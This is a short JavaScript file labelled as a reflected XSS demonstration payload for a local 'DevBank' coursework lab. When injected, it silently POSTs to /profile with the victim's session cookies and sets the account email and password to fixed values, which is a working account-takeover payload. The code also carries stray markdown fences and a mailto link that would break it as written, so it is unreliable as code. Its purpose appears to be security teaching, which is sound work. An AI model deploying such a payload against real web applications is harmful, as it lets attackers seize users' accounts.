/* B.2 Stored? No — reflected XSS demonstration payload.
Intended only for the local DevBank coursework lab. */

(() => {
const form = new URLSearchParams({
email: "[b2-xss-demo@devbank.local](mailto:b2-xss-demo@devbank.local)",
password: "B2-Demo-Pass-2026!"
});

```
fetch("/profile", {
    method: "POST",
    credentials: "same-origin",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
    },
    body: form.toString()
})
.then(response => {
    console.log("[B.2] Profile update request completed:", response.status);
})
.catch(error => {
    console.error("[B.2] Profile update failed:", error);
});
```

})();
